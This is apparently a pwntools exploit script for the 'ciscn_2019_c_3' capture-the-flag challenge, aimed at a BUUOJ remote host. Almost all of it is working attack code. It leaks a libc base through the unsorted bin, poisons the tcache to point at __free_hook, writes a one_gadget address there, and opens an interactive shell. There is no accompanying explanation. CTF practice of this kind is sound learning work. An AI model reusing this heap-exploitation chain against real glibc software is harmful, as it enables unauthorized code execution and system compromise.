from pwn import *
import sys
remote_addr = ["node4.buuoj.cn",25856]
libc = ELF('./libc.so.6')
#elf = ELF('')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = process("./ciscn_2019_c_3_patched")
    context(arch='amd64', os='linux')
    context.terminal = ['tmux', 'splitw', '-h']
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        #context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

DEBUG = 0

def debug(bp = None):
    if DEBUG == 1:
        if bp != None:
            gdb.attach(p, bp)
        else:
            gdb.attach(p)

def menu(idx):
    sa(b'Command: \n', str(idx).encode())

def add(size, content):
    menu(1)
    sa(b'size: ', str(size).encode())
    sla(b'name: ', content)

def show(idx):
    menu(2)
    sa(b'index: ', str(idx).encode())

def delete(idx):
    menu(3)
    sa(b'weapon:', str(idx).encode())

def backdoor(idx):
    menu(666)
    sa(b'weapon:', str(idx).encode())


debug('''
    b *$rebase(0xeba)
    b *$rebase(0x1273)
''')


add(0x100, b'a')
add(0x60, b'b')
for i in range(8):
    delete(0)
show(0)
ru(b'attack_times: ')
leak_addr = int(rc(15), 10)
libc.address = leak_addr - libc.sym['main_arena'] - 96
pr('libc_base', libc.address)

free_hook = libc.sym['__free_hook']
one = libc.address + 0x4f322

add(0x60, b'a' * 0x10 + p64(free_hook - 0x10))
delete(2)
delete(2)

for i in range(0x20):
    backdoor(2)

add(0x60, b'c')
add(0x60, b'c')
add(0x60, p64(one))

delete(1)

shell()
